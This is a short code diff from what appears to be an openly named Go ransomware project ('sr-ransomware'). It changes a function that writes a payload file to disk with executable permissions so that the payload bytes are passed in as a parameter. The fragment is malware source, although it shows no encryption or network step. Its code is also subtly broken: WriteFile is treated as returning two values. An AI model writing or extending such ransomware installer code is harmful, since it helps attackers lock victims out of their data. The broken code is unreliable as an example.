@@ -21,8 +21,8 @@ import (
     "github.com/sug0/sr-ransomware/go/net/ratelimit"
 )
 
-func InstallPayload() error {
-    _, err := ioutil.WriteFile(cryptoPayload, cryptoserviceBytes, 0744)
+func InstallPayload(cryptoPayloadBytes []byte) error {
+    _, err := ioutil.WriteFile(cryptoPayload, cryptoPayloadBytes, 0744)
     if err != nil {
         return errors.Wrap(pkg, "failed to install payload", err)
     }
